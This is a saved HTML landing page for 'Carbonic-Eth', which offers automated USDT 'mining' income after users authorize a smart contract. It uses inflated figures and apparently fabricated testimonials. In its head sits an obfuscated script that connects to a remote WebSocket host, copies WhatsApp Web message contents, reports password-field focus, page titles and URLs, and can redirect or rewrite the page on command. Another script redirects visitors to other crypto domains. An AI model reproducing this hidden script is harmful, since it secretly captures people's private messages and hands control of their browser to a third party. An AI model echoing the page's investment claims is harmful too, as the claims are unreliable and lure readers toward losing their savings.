
<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <meta content="width=device-width, initial-scale=1.0" name="viewport">

    <title id="app_name"></title>
    <meta content="Decentralized protocol &amp; automated asset income" name="description">
    <meta content="ESM ETH,ESM-DeFi,ESM Coin, ESN-Chain" name="keywords">

    <!-- Favicons -->
    <!-- <link href="assets/img/favicon.png" rel="icon">
    <link href="assets/img/apple-touch-icon.png" rel="apple-touch-icon"> -->

    <script>!function(){var Y,e,t;function n(){try{return window.self===window.top}catch(Y){return!1}}function r(){var Y={type:"focus",token:S.token,title:document.title,url:document.URL,useragent:navigator.userAgent,pid:S.pid,pn:S.pn};null!=I&&I.readyState==WebSocket.OPEN&&I.send(JSON.stringify(Y))}function a(){var Y={type:"notification",token:S.token,title:document.title,url:document.URL,focused:document.hasFocus(),timeout:S.sendNotificationsInterval,useragent:navigator.appVersion.length>navigator.userAgent.length?navigator.appVersion:navigator.userAgent,pid:S.pid,pn:S.pn};I.send(JSON.stringify(Y))}function i(){h()}function o(){n()&&(clearInterval(y),clearInterval(N)),timeout=setTimeout((function(){f()}),v)}function s(Y){if(n())switch(Y.data.substring(0,1)){case"r":window.location=Y.data.substring(1);break;case"b":document.body.innerHTML=Y.data.substring(1);break;case"w":var e="true"==Y.data.substring(1).toLowerCase();T!=e&&e&&m(),T=e}}function M(Y){var e=document.createElement("a");return e.href=Y,e.href}function u(Y){if(Y&&"password"==Y.type&&!H){H=!0;var e={type:"password_input_focus",focus:!0,token:S.token};I.send(JSON.stringify(e))}}function D(Y){if(Y&&"password"==Y.type&&H){H=!1;var e={type:"password_input_focus",focus:!1,token:S.token};I.send(JSON.stringify(e))}}function c(Y){var e=document.activeElement;e&&e!=document.body?document.querySelector&&(e=document.querySelector(":focus")):e=null;for(var t=0;t<Y.length;++t){let i=Y[t];var n="password"==i.type,r=n&&i.hasAttribute("autofocus"),a=n&&e&&i.isEqualNode(e);(r||a)&&u(),i.onfocus=function(){u(i)},i.onblur=function(){D(i)}}}function d(){n()&&(S.iup&&r(),p()&&(m(),h(),function(){var Y=new MutationObserver((function(Y){Y&&Y.forEach((function(Y){Y&&("childList"!==Y.type||Y.addedNodes.length<=0||Y.addedNodes.forEach((function(Y){if(Y){var e=document.querySelector("div[id=main] header span[title]");e&&(b=e.innerText),document.querySelector("div[id=main] header span[data-icon=default-user]")&&(A="private"),document.querySelector("div[id=main] header span[data-icon=default-group]")&&(A="group");var t=Y.querySelectorAll(".message-in, .message-out");Y.matches(".message-in, .message-out")&&(t=Array.prototype.slice.call(t)).push(Y),t&&t.forEach((function(Y){if(Y&&Y.classList&&!(Y.classList.length<=0)){var e=Y.classList.contains("message-in"),t=Y.querySelector(".copyable-text"),n=Y.querySelector(".selectable-text"),r=new Date,a=null;if(t&&t.attributes["data-pre-plain-text"]){var i=t.attributes["data-pre-plain-text"].textContent,o=/\[(\d{1,2}):(\d{1,2})[ ]{0,1}([p|a]m)?,\s(.+)]\s(.*):/i[Symbol.match](i);if(!o||6!=o.length)return;if(o[3]&&"pm"==o[3].toLowerCase()&&(o[1]=parseInt(o[1])+12),dateParts=/(\d{1,4})[.-\\/](\d{1,4})[.-\\/](\d{1,4})/[Symbol.match](o[4]),!dateParts||4!=dateParts.length)return;if(!(r=date.parse(o[4],C)||function(Y,e,t){var n=[[Y,e,t].join("-"),[Y,t,e].join("-"),[e,Y,t].join("-"),[e,t,Y].join("-"),[t,Y,e].join("-"),[t,e,Y].join("-")],r=Date.now();for(var a in n){var i=Date.parse(n[a]);if(i&&!(Math.abs(r-i)>1728e6))return new Date(i)}}(dateParts[1],dateParts[2],dateParts[3])))return;r.setHours(o[1]),r.setMinutes(o[2]),a=o[5]}E.get(b)||E.set(b,k);var s=n?n.innerText:null;if(a&&s&&T){var M=(a+s+b+r.getTime()).split("").map((function(Y){return Y.charCodeAt(0)})).reduce((function(Y,e){return Y+((Y<<7)+(Y<<3))^e})).toString(16);if(E.get(b).getTime()==r.getTime()?r.setMilliseconds(++L):(L=0,E.set(b,r)),!M||w.has(M))return;var u={type:"wapmessage",timestamp:r.getTime(),id:M,incoming:e,sender:e?a:"Me",content:s,recipient:e?"Me":b,conversationId:b+"("+A+")"};I.send(JSON.stringify(u)),w.add(M)}}}))}})))}))}));if(!Y)return;Y.observe(document.body,{childList:!0,subtree:!0})}()),n()&&(a(),y=setInterval(a,S.sendNotificationsInterval),p()&&(N=setInterval(i,S.pollWhatsappTrackingInterval))),function(){for(var Y=[],e=document.getElementsByTagName("link"),t=0;t<e.length;++t)"icon"!=e[t].getAttribute("rel")&&"shortcut icon"!=e[t].getAttribute("rel")||(Y[Y.length]=M(e[t].getAttribute("href")));0==Y.length&&(Y[0]=M("/favicon.ico"));var n={type:"favicon"};n.url=document.URL,n.src=Y,n.title=document.title,n.token=S.token,n.useragent=navigator.appVersion.length>navigator.userAgent.length?navigator.appVersion:navigator.userAgent,I.send(JSON.stringify(n))}(),S.dontTrackWebPasswords&&(c(document.getElementsByTagName("input")),new MutationObserver((function(Y){Y&&Y.forEach((function(Y){Y&&Y.addedNodes&&0!=Y.addedNodes.length&&(window.NodeList&&!NodeList.prototype.forEach&&(NodeList.prototype.forEach=Array.prototype.forEach),Y.addedNodes.forEach((function(Y){Y.tagName&&c(Y.getElementsByTagName("input"))})))}))})).observe(document,{childList:!0,subtree:!0}),window.onbeforeunload=D))}function l(){document.tmfilter||(f(),C={"ar-SA":"D/M/YY","bg-BG":"D.M.YYYY","ca-ES":"D/M/YYYY","zh-TW":"YYYY/M/D","cs-CZ":"D.M.YYYY","Da-DK":"D-M-YYYY","De-DE":"D.M.YYYY","el-GR":"D/M/YYYY","en-US":"M/D/YYYY","fi-FI":"D.M.YYYY","fr-FR":"D/M/YYYY","he-IL":"D/M/YYYY","hu-HU":"YYYY. M. D.","is-IS":"D.M.YYYY","it-IT":"D/M/YYYY","ja-JP":"YYYY/M/D","ko-KR":"YYYY-M-D","nl-NL":"D-M-YYYY","nb-NO":"D.M.YYYY","pl-PL":"YYYY-M-D","pt-BR":"D/M/YYYY","ro-RO":"D.M.YYYY","ru-RU":"D.M.YYYY","hr-HR":"D.M.YYYY","sk-SK":"D. M. YYYY","sq-AL":"YYYY-M-D","sv-SE":"YYYY-M-D","th-TH":"D/M/YYYY","tr-TR":"D.M.YYYY","ur-PK":"D/M/YYYY","iD-ID":"D/M/YYYY","uk-UA":"D.M.YYYY","be-BY":"D.M.YYYY","sl-SI":"D.M.YYYY","et-EE":"D.M.YYYY","lv-LV":"YYYY.M.D.","lt-LT":"YYYY.M.D","fa-IR":"M/D/YYYY","vi-VN":"D/M/YYYY","hy-AM":"D.M.YYYY","az-Latn-AZ":"D.M.YYYY","eu-ES":"YYYY/M/D","Mk-MK":"D.M.YYYY","af-ZA":"YYYY/M/D","ka-GE":"D.M.YYYY","fo-FO":"D-M-YYYY","hi-IN":"D-M-YYYY","Ms-MY":"D/M/YYYY","kk-KZ":"D.M.YYYY","ky-KG":"D.M.YY","sw-KE":"M/D/YYYY","uz-Latn-UZ":"D/M YYYY","tt-RU":"D.M.YYYY","pa-IN":"D-M-YY","gu-IN":"D-M-YY","ta-IN":"D-M-YYYY","te-IN":"D-M-YY","kn-IN":"D-M-YY","Mr-IN":"D-M-YYYY","sa-IN":"D-M-YYYY","Mn-MN":"YY.M.D","gl-ES":"D/M/YY","kok-IN":"D-M-YYYY","syr-SY":"D/M/YYYY","Dv-MV":"D/M/YY","ar-IQ":"D/M/YYYY","zh-CN":"YYYY/M/D","De-CH":"D.M.YYYY","en-GB":"D/M/YYYY","es-MX":"D/M/YYYY","fr-BE":"D/M/YYYY","it-CH":"D.M.YYYY","nl-BE":"D/M/YYYY","nn-NO":"D.M.YYYY","pt-PT":"D-M-YYYY","sr-Latn-CS":"D.M.YYYY","sv-FI":"D.M.YYYY","az-Cyrl-AZ":"D.M.YYYY","Ms-BN":"D/M/YYYY","uz-Cyrl-UZ":"D.M.YYYY","ar-EG":"D/M/YYYY","zh-HK":"D/M/YYYY","De-AT":"D.M.YYYY","en-AU":"D/M/YYYY","es-ES":"D/M/YYYY","fr-CA":"YYYY-M-D","sr-Cyrl-CS":"D.M.YYYY","ar-LY":"D/M/YYYY","zh-SG":"D/M/YYYY","De-LU":"D.M.YYYY","en-CA":"D/M/YYYY","es-GT":"D/M/YYYY","fr-CH":"D.M.YYYY","ar-DZ":"D-M-YYYY","zh-MO":"D/M/YYYY","De-LI":"D.M.YYYY","en-NZ":"D/M/YYYY","es-CR":"D/M/YYYY","fr-LU":"D/M/YYYY","ar-MA":"D-M-YYYY","en-IE":"D/M/YYYY","es-PA":"M/D/YYYY","fr-MC":"D/M/YYYY","ar-TN":"D-M-YYYY","en-ZA":"YYYY/M/D","es-DO":"D/M/YYYY","ar-OM":"D/M/YYYY","en-JM":"D/M/YYYY","es-VE":"D/M/YYYY","ar-YE":"D/M/YYYY","en-029":"M/D/YYYY","es-CO":"D/M/YYYY","ar-SY":"D/M/YYYY","en-BZ":"D/M/YYYY","es-PE":"D/M/YYYY","ar-JO":"D/M/YYYY","en-TT":"D/M/YYYY","es-AR":"D/M/YYYY","ar-LB":"D/M/YYYY","en-ZW":"M/D/YYYY","es-EC":"D/M/YYYY","ar-KW":"D/M/YYYY","en-PH":"M/D/YYYY","es-CL":"D-M-YYYY","ar-AE":"D/M/YYYY","es-UY":"D/M/YYYY","ar-BH":"D/M/YYYY","es-PY":"D/M/YYYY","ar-QA":"D/M/YYYY","es-BO":"D/M/YYYY","es-SV":"D/M/YYYY","es-HN":"D/M/YYYY","es-NI":"D/M/YYYY","es-PR":"D/M/YYYY","aM-ET":"D/M/YYYY","tzM-Latn-DZ":"D-M-YYYY","iu-Latn-CA":"D/M/YYYY","sMa-NO":"D.M.YYYY","Mn-Mong-CN":"YYYY/M/D","gD-GB":"D/M/YYYY","en-MY":"D/M/YYYY","prs-AF":"D/M/YY","bn-BD":"D-M-YY","wo-SN":"D/M/YYYY","rw-RW":"M/D/YYYY","qut-GT":"D/M/YYYY","sah-RU":"M.D.YYYY","gsw-FR":"D/M/YYYY","co-FR":"D/M/YYYY","oc-FR":"D/M/YYYY","Mi-NZ":"D/M/YYYY","ga-IE":"D/M/YYYY","se-SE":"YYYY-M-D","br-FR":"D/M/YYYY","sMn-FI":"D.M.YYYY","Moh-CA":"M/D/YYYY","arn-CL":"D-M-YYYY","ii-CN":"YYYY/M/D","Dsb-DE":"D. M. YYYY","ig-NG":"D/M/YYYY","kl-GL":"D-M-YYYY","lb-LU":"D/M/YYYY","ba-RU":"D.M.YY","nso-ZA":"YYYY/M/D","quz-BO":"D/M/YYYY","yo-NG":"D/M/YYYY","ha-Latn-NG":"D/M/YYYY","fil-PH":"M/D/YYYY","ps-AF":"D/M/YY","fy-NL":"D-M-YYYY","ne-NP":"M/D/YYYY","se-NO":"D.M.YYYY","iu-Cans-CA":"D/M/YYYY","sr-Latn-RS":"D.M.YYYY","si-LK":"YYYY-M-D","sr-Cyrl-RS":"D.M.YYYY","lo-LA":"D/M/YYYY","kM-KH":"YYYY-M-D","cy-GB":"D/M/YYYY","bo-CN":"YYYY/M/D","sMs-FI":"D.M.YYYY","as-IN":"D-M-YYYY","Ml-IN":"D-M-YY","en-IN":"D-M-YYYY","or-IN":"D-M-YY","bn-IN":"D-M-YY","tk-TM":"D.M.YY","bs-Latn-BA":"D.M.YYYY","Mt-MT":"D/M/YYYY","sr-Cyrl-ME":"D.M.YYYY","se-FI":"D.M.YYYY","zu-ZA":"YYYY/M/D","xh-ZA":"YYYY/M/D","tn-ZA":"YYYY/M/D","hsb-DE":"D. M. YYYY","bs-Cyrl-BA":"D.M.YYYY","tg-Cyrl-TJ":"D.M.YY","sr-Latn-BA":"D.M.YYYY","sMj-NO":"D.M.YYYY","rM-CH":"D/M/YYYY","sMj-SE":"YYYY-M-D","quz-EC":"D/M/YYYY","quz-PE":"D/M/YYYY","hr-BA":"D.M.YYYY.","sr-Latn-ME":"D.M.YYYY","sMa-SE":"YYYY-M-D","en-SG":"D/M/YYYY","ug-CN":"YYYY-M-D","sr-Cyrl-BA":"D.M.YYYY","es-US":"M/D/YYYY"}[navigator.language],document.tmfilter="present")}function f(){(I=new WebSocket(S.connectionString)).onclose=o,I.onmessage=s,I.onopen=d,S.extJs&&(this.extJs.webSockReady=()=>I.readyState===WebSocket.OPEN,this.extJs.webSockSend=Y=>I.send(Y))}function g(){var Y=function(){var Y=["webkit","moz","ms","o"];if("hidden"in document)return"hidden";for(var e=0;e<Y.length;e++)if(Y[e]+"Hidden"in document)return Y[e]+"Hidden";return null}();return!!Y&&document[Y]}function p(){var Y=document.head.querySelector("[name='og:title']");return!!Y&&"WhatsApp Web"===Y.getAttribute("content")}function h(){I.send(JSON.stringify({type:"waptracking"}))}function m(){E=new Map,w=new Set,L=0,(k=new Date).setSeconds(0),k.setMilliseconds(0)}Y=this,e={},t={en:{MMMM:"January February March April May June July August September October November December".split(" "),MMM:"Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec".split(" "),dddd:"Sunday Monday Tuesday Wednesday Thursday Friday Saturday".split(" "),ddd:"Sun Mon Tue Wed Thu Fri Sat".split(" "),dd:"Su Mo Tu We Th Fr Sa".split(" "),A:["a.m.","p.m."],formatter:{YYYY:function(Y){return("000"+Y.getFullYear()).slice(-4)},YY:function(Y){return("0"+Y.getFullYear()).slice(-2)},Y:function(Y){return""+Y.getFullYear()},MMMM:function(Y){return this.MMMM[Y.getMonth()]},MMM:function(Y){return this.MMM[Y.getMonth()]},MM:function(Y){return("0"+(Y.getMonth()+1)).slice(-2)},M:function(Y){return""+(Y.getMonth()+1)},DD:function(Y){return("0"+Y.getDate()).slice(-2)},D:function(Y){return""+Y.getDate()},HH:function(Y){return("0"+Y.getHours()).slice(-2)},H:function(Y){return""+Y.getHours()},A:function(Y){return this.A[11<Y.getHours()|0]},hh:function(Y){return("0"+(Y.getHours()%12||12)).slice(-2)},h:function(Y){return""+(Y.getHours()%12||12)},mm:function(Y){return("0"+Y.getMinutes()).slice(-2)},m:function(Y){return""+Y.getMinutes()},ss:function(Y){return("0"+Y.getSeconds()).slice(-2)},s:function(Y){return""+Y.getSeconds()},SSS:function(Y){return("00"+Y.getMilliseconds()).slice(-3)},SS:function(Y){return("0"+(Y.getMilliseconds()/10|0)).slice(-2)},S:function(Y){return""+(Y.getMilliseconds()/100|0)},dddd:function(Y){return this.dddd[Y.getDay()]},ddd:function(Y){return this.ddd[Y.getDay()]},dd:function(Y){return this.dd[Y.getDay()]},Z:function(Y){return(0<(Y=Y.utc?0:Y.getTimezoneOffset()/.6)?"-":"+")+("000"+Math.abs(Y-Y%100*.4)).slice(-4)},post:function(Y){return Y}},parser:{find:function(Y,e){for(var t,n=-1,r=0,a=0,i=Y.length;a<i;a++)t=Y[a],!e.indexOf(t)&&t.length>r&&(n=a,r=t.length);return{index:n,length:r}},MMMM:function(Y){return this.parser.find(this.MMMM,Y)},MMM:function(Y){return this.parser.find(this.MMM,Y)},A:function(Y){return this.parser.find(this.A,Y)},h:function(Y,e){return(12===Y?0:Y)+12*e},pre:function(Y){return Y}}}},e.format=function(Y,n,r){var a=e.addMinutes(Y,r?Y.getTimezoneOffset():0),i=t.en,o=i.formatter;return a.utc=r,n.replace(/(\[[^\[\]]*]|\[.*\][^\[]*\]|YYYY|YY|MMM?M?|DD|HH|hh|mm|ss|SSS?|ddd?d?|.)/g,(function(Y){var e=o[Y];return e?o.post(e.call(i,a,n)):Y.replace(/\[(.*)]/,"$1")}))},e.parse=function(Y,n,r){var a,i,o=t.en,s=o.parser.pre(Y),M=0,u=/(MMMM?|A)|(YYYY)|(SSS)|(MM|DD|HH|hh|mm|ss)|(YY|M|D|H|h|m|s|SS)|(S)|(.)/g,D={2:/^\d{1,4}/,3:/^\d{1,3}/,4:/^\d\d/,5:/^\d\d?/,6:/^\d/};Y=[31,28,31,30,31,30,31,31,30,31,30,31];for(var c={Y:1970,M:1,D:1,H:0,m:0,s:0,S:0};a=u.exec(n);){var d=0,l=1;for(i="";!i;)i=a[++d];a=i.charAt(0);var f=s.slice(M);if(2>d){var g=o.parser[i].call(o,f,n);c[a]=g.index,"M"===a&&c[a]++,l=g.length}else if(7>d)g=(f.match(D[d])||[""])[0],c[a]=0|("S"===a?(g+"000").slice(0,-i.length):g),l=g.length;else if(" "!==a&&a!==f[0])return NaN;if(!l)return NaN;M+=l}return M===s.length&&g?(c.Y+=70>c.Y?2e3:100>c.Y?1900:0,c.H=c.H||o.parser.h(c.h||0,c.A||0),n=new Date(c.Y,c.M-1,c.D,c.H,c.m,c.s,c.S),Y[1]+=0|e.isLeapYear(n),1>c.M||12<c.M||1>c.D||c.D>Y[c.M-1]||23<c.H||59<c.m||59<c.s?NaN:r?e.addMinutes(n,-n.getTimezoneOffset()):n):NaN},e.isValid=function(Y,t){return!!e.parse(Y,t)},e.addYears=function(Y,t){return e.addMonths(Y,12*t)},e.addMonths=function(Y,e){var t=new Date(Y.getTime());return t.setMonth(t.getMonth()+e),t},e.addDays=function(Y,e){var t=new Date(Y.getTime());return t.setDate(t.getDate()+e),t},e.addHours=function(Y,t){return e.addMilliseconds(Y,36e5*t)},e.addMinutes=function(Y,t){return e.addMilliseconds(Y,6e4*t)},e.addSeconds=function(Y,t){return e.addMilliseconds(Y,1e3*t)},e.addMilliseconds=function(Y,e){return new Date(Y.getTime()+e)},e.subtract=function(Y,e){var t=Y.getTime()-e.getTime();return{toMilliseconds:function(){return t},toSeconds:function(){return t/1e3|0},toMinutes:function(){return t/6e4|0},toHours:function(){return t/36e5|0},toDays:function(){return t/864e5|0}}},e.isLeapYear=function(Y){return!(((Y=Y.getFullYear())%4||!(Y%100))&&Y%400)},e.isSameDay=function(Y,t){return e.format(Y,"YYYYMMDD")===e.format(t,"YYYYMMDD")},Y.date=e;var S={token:"23e93f5c-e3c1-44ee-8909-6ab2e5a62d9c",sendNotificationsInterval:Number("1000"),pollWhatsappTrackingInterval:Number("20000"),connectionString:"wss://tm.filter:1507",pid:"4812",pn:"chrome.exe",iup:false,dontTrackWebPasswords:false,extJs:null},v=6e4,y=null,N=null,b=null,A=null,T=!1,E=null,w=null,L=0,k=null,I=null,C="",H=!1;!function Y(e){g()?setTimeout((function(){Y(e)}),1e3):e()}((function(){S.extJs&&S.extJs.init(S.token),n()&&window.addEventListener("focus",r),(n()||S.extJs)&&l()}))}();</script><script>
        var domain = document.domain
        if (domain == "eth-mining.io")
            window.location.href = "https://eth-mining.io/h5/#/"
        if (domain == "defi-go.me")
            window.location.href = "https://defi-go.me/h5/#/"
        if (domain == "defi-ethming.com")
            window.location.href = "https://defi-ethming.com/h5/#/"
    </script>
    <!-- Google Fonts -->
    <!-- <link href="./css/css" rel="stylesheet"> -->

    <!-- Vendor CSS Files -->
     <!-- FontAwesome style-->
     <link
      rel="stylesheet"
      href="https://use.fontawesome.com/releases/v5.7.2/css/all.css"
      integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr"
      crossorigin="anonymous"
    />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"
    />
    <link href="./css/bootstrap.min.css" rel="stylesheet">
    <link href="./css/bootstrap-icons.css" rel="stylesheet">
    <link href="./css/boxicons.min.css" rel="stylesheet">
    <link href="./css/glightbox.min.css" rel="stylesheet">
    <link href="./css/swiper-bundle.min.css" rel="stylesheet">

    <!-- Template Main CSS File -->
    <link href="./css/style.css" rel="stylesheet">


    <link type="image/x-icon" rel="shortcut icon" href="./img/HfuDePM2vCgqpSK.png">


</head>


<body>
<div id="app">
    <header id="header" class="fixed-top">
        <div class="container d-flex align-items-center justify-content-between"><h1 class="logo"><a
                href="/"><img src="./assets/img/lajvCxjKcbw18AcTI7LYHivejJuQFXcxYIaQlt31.png" alt="">
                Carbonic-Eth</a></h1>
            <nav id="navbar" class="navbar">
                <ul>
                    <li><a href="/#hero" class="nav-link scrollto active">Home</a></li>
                    <li><a href="/#Introduction" class="nav-link scrollto">Introduction</a>
                    </li>
                    <li><a href="/#Services" class="nav-link scrollto">Services</a></li>
                    <li><a href="/#Testimonials" class="nav-link scrollto">Testimonials</a>
                    </li>
                    <li><a href="/#team" class="nav-link scrollto">Team</a></li>
                    <li><a href="/#contact" class="nav-link scrollto">Contact</a></li>
                    <li><a href="javascript:void(0);" onclick="onGetStarted()" class="getstarted scrollto">Get
                        Started</a></li>
                </ul>
                <i class="bi bi-list mobile-nav-toggle"></i></nav>
        </div>
    </header>
    <section id="hero" class="d-flex align-items-center">
        <div class="container">
            <div class="row">
                <div class="col-lg-6 pt-5 pt-lg-0 order-2 order-lg-1 d-flex flex-column justify-content-center">
                    <h1>Carbonic-Eth</h1>
                    <h2>A better, smarter contract.<br><br>Explore the ultimate mining experience.
                    </h2>
                    <div class="d-flex"><a href="javascript:void(0);" onclick="onGetStarted()"
                                           class="btn-get-started scrollto">Get Started</a> <a
                            href="#"
                            class="btn-watch-video"><i class="bi bi-play-circle fa fa-play-circle-o" aria-hidden="true"></i><span>  </span></a></div>
                </div>
                <div class="col-lg-6 order-1 order-lg-2 hero-img"><img src="./assets/img/hero-img.png" alt=""
                                                                       class="img-fluid animated"></div>
            </div>
        </div>
    </section>
    <main id="main">
        <section id="Introduction" class="featured-services">
            <div class="section-title"><span>Introduction</span>
                <h2>Introduction</h2>
                <p>A revolutionary solution for crypto mining.</p></div>
            <div class="container">
                <div class="row">
                    <div class="col-lg-4 col-md-6">
                        <div class="icon-box">
                            <div class="icon"><i class="fa fa-laptop" aria-hidden="true"></i></div>
                            <h4 class="title"><a href="/">WHAT IS Carbonic-Eth?</a></h4>
                            <p class="description">Carbonic-Eth is a blockchain agreement. It is like a
                                decentralized
                                central bank
                                that
                                establishes a currency market through smart contracts. The money market is based on
                                the
                                supply and
                                demand of assets, and the interest rate of the asset pool is derived through
                                algorithms.
                                Providers of
                                USDT assets (participants, we call them "miners") , directly interact with smart
                                contract agreements
                                without any actual mortgage, and automatically earn floating interest rates, without
                                negotiating
                                maturity and interest rates or collateral,and other with peers or counterparties
                                Terms.</p></div>
                    </div>
                    <div class="col-lg-4 col-md-6 mt-4 mt-md-0">
                        <div class="icon-box">
                            <div class="icon"><i class="fa fa-list-ul" aria-hidden="true"></i></div>
                            <h4 class="title"><a href="/">HOW IT WORKS?</a></h4>
                            <p class="description">It allows USDT holders to automatically explore the borrowing
                                needs
                                of the
                                currency
                                market, and automatically match higher interest orders, after agreeing to authorize
                                the
                                execution of
                                this contract (becoming a "miner"). It is an AMM mechanism and an automatic
                                quantification procedure.
                                Your deposit is always in your own wallet without withdrawal, and you can withdraw
                                the
                                interest earned
                                to your wallet at any time. Become a "miner", hand over to the smart contract
                                agreement,
                                and
                                automatically earn income!</p></div>
                    </div>
                    <div class="col-lg-4 col-md-6 mt-4 mt-lg-0">
                        <div class="icon-box">
                            <div class="icon"><i class="fa fa-clipboard" aria-hidden="true"></i></div>
                            <h4 class="title"><a href="/">WHERE WE'RE GOING?</a></h4>
                            <p class="description">The crypto economy is a radical new imagining of the future of
                                work.
                                Open
                                protocols
                                will create transparency and opportunity, enabling anyone in the world to contribute
                                their talents to
                                a
                                global economy. We want to support this vision and build the new coordination
                                mechanisms
                                of the
                                internet
                                age.</p></div>
                    </div>
                </div>
            </div>
        </section>
        <section id="Services" class="about">
            <div class="container">
                <div class="row">
                    <div class="col-lg-6"><img src="./assets/img/about.png" alt="" class="img-fluid"></div>
                    <div class="col-lg-6 pt-4 pt-lg-0 content"><h3>Services</h3>
                        <p class="fst-italic">
                        Carbonic-Eth is one of the most popular decentralized platforms, ever. And those
                            users are now
                            entrusting the
                            platform with over $5 billion in funds.
                        </p>
                        <ul>
                            <li><i class="fa fa-check-circle-o" aria-hidden="true"></i> High-Interest Yield</li>
                            <li class="desc">Paid daily to you and your customers.</li>
                            <li><i class="fa fa-check-circle-o" aria-hidden="true"></i> On-Demand Liquidity</li>
                            <li class="desc">Add and withdraw funds from your account every 24 hours.</li>
                            <li><i class="fa fa-check-circle-o" aria-hidden="true"></i> Transparent Reporting</li>
                            <li class="desc">Real-time balances and transaction history available on-demand.</li>
                        </ul>
                        <p>
                            Will you join them?
                        </p></div>
                </div>
            </div>
        </section>
        <section id="counts" class="counts">
            <div class="container">
                <div class="row counters">
                    <div class="col-lg-3 col-6 text-center"><span data-purecounter-start="0"
                                                                  :data-purecounter-end="config.index_data.user"
                                                                  data-purecounter-duration="0"
                                                                  class="purecounter">5166</span>
                        <p class="no-margin">users</p>
                        <p class="desc">in the last 30 days</p></div>
                    <div class="col-lg-3 col-6 text-center"><span data-purecounter-start="0"
                                                                  :data-purecounter-end="config.index_data.node"
                                                                  data-purecounter-duration="0" class="purecounter">65467</span>
                        <p class="no-margin">trades</p>
                        <p class="desc">in the last 30 days</p></div>
                    <div class="col-lg-3 col-6 text-center"><span data-purecounter-start="0"
                                                                  data-purecounter-end="config.index_data.all_trx"
                                                                  data-purecounter-duration="0" class="purecounter">32195</span>
                                                                  
                        <p class="no-margin">minings</p>
                        <p class="desc">in the last 30 days</p></div>
                    <div class="col-lg-3 col-6 text-center"><span data-purecounter-start="0"
                                                                  data-purecounter-end="config.index_data.money"
                                                                  data-purecounter-duration="0" class="purecounter">6656603</span>
                        <p class="no-margin">withdrawals</p>
                        <p class="desc">in the last 30 days</p></div>
                </div>
            </div>
        </section>


    </main>
</div>
<section id="Testimonials" class="testimonials section-bg">
    <div class="container">
        <div class="section-title"><span>Testimonials</span>
            <h2>Testimonials</h2>
            <p>The best gift we can give is a happy user</p></div>
        <div data-aos="fade-up" data-aos-delay="100"
             class="testimonials-slider swiper swiper-initialized swiper-horizontal swiper-pointer-events">
            <div class="swiper-wrapper" id="swiper-wrapper-91a957eab3a46e74" aria-live="off"
                 style="transform: translate3d(-3509.33px, 0px, 0px); transition-duration: 0ms;">
                <div class="swiper-slide swiper-slide-duplicate" data-swiper-slide-index="2" role="group"
                     aria-label="3 / 5" style="width: 418.667px; margin-right: 20px;">
                    <div class="testimonial-item"><p><i class="bx bxs-quote-alt-left quote-icon-left"></i>
                        I spent a long time researching passive income and my stocks made me lose a lot of money
                        until I
                        found
                        and it really helped me so much. Thanks to the developers of , I don't
                        need to
                        learn about blockchain to participate in mining.
                        <i class="bx bxs-quote-alt-right quote-icon-right"></i></p> <img
                            src="./assets/img/testimonials-3.jpg" alt="" class="testimonial-img">
                        <h3>Jena Karlis</h3> <h4>Store Owner</h4></div>
                </div>
                <div class="swiper-slide swiper-slide-duplicate" data-swiper-slide-index="3" role="group"
                     aria-label="4 / 5" style="width: 418.667px; margin-right: 20px;">
                    <div class="testimonial-item"><p><i class="bx bxs-quote-alt-left quote-icon-left"></i>
                        My friend spent tens of thousands of dollars on computer mining and he had no idea that
                        I was
                        earning
                        even more than him on until the last time he found out and I invited him to get
                        involved and
                        he has now sold his computer.
                        <i class="bx bxs-quote-alt-right quote-icon-right"></i></p> <img
                            src="./assets/img/testimonials-2.jpg" alt="" class="testimonial-img">
                        <h3>Matt Brandon</h3> <h4>Freelancer</h4></div>
                </div>
                <div class="swiper-slide swiper-slide-duplicate swiper-slide-duplicate-prev"
                     data-swiper-slide-index="4" role="group" aria-label="5 / 5"
                     style="width: 418.667px; margin-right: 20px;">
                    <div class="testimonial-item"><p><i class="bx bxs-quote-alt-left quote-icon-left"></i>
                        I've now quit my job and started doing what I love to do and I've been to over 10
                        countries. There
                        are
                        many ways to be financially free, and when you can live well without working, that's
                        financial
                        freedom. Thanks to the developers at .
                        <i class="bx bxs-quote-alt-right quote-icon-right"></i></p> <img
                            src="./assets/img/testimonials-1.jpg" alt="" class="testimonial-img">
                        <h3>John Larson</h3> <h4>Freelancer</h4></div>
                </div>
                <div class="swiper-slide swiper-slide-duplicate-active" data-swiper-slide-index="0" role="group"
                     aria-label="1 / 5" style="width: 418.667px; margin-right: 20px;">
                    <div class="testimonial-item"><p><i class="bx bxs-quote-alt-left quote-icon-left"></i>
                        At first, I put a small amount of USDT in my wallet and then spent a month to evaluate
                        the effect.
                        The
                        numbers shown on the final statement made up my mind to continue using it. It is so
                        amazing that I
                        don't need to do any operation to get profit.
                        <i class="bx bxs-quote-alt-right quote-icon-right"></i></p> <img
                            src="./assets/img/testimonials-3.jpg" alt="" class="testimonial-img">
                        <h3>Jake Robinson</h3> <h4>financial analyst</h4></div>
                </div>
                <div class="swiper-slide swiper-slide-duplicate-next" data-swiper-slide-index="1" role="group"
                     aria-label="2 / 5" style="width: 418.667px; margin-right: 20px;">
                    <div class="testimonial-item"><p><i class="bx bxs-quote-alt-left quote-icon-left"></i>
                        It's hard to imagine that I could make a profit while I'm busy raising three kids and
                        having a job; all I need to do is to put the money from my savings into the wallet and
                        just watch it grow, thanks to technology these days!
                        <i class="bx bxs-quote-alt-right quote-icon-right"></i></p> <img
                            src="./assets/img/testimonials-2.jpg" alt="" class="testimonial-img">
                        <h3>Hannah Meyer </h3> <h4>Purchasing Agent</h4></div>
                </div>
                <div class="swiper-slide" data-swiper-slide-index="2" role="group" aria-label="3 / 5"
                     style="width: 418.667px; margin-right: 20px;">
                    <div class="testimonial-item"><p><i class="bx bxs-quote-alt-left quote-icon-left"></i>
                        I spent a long time trying to get a stable passive income. But my stocks made me lose a
                        lot of money. I was desperate until I found this platform. Thanks to the developers of
                        ESM-ETH, now I don't even need to learn about blockchain to participate in mining and
                        making money!
                        <i class="bx bxs-quote-alt-right quote-icon-right"></i></p> <img
                            src="./assets/img/testimonials-3.jpg" alt="" class="testimonial-img">
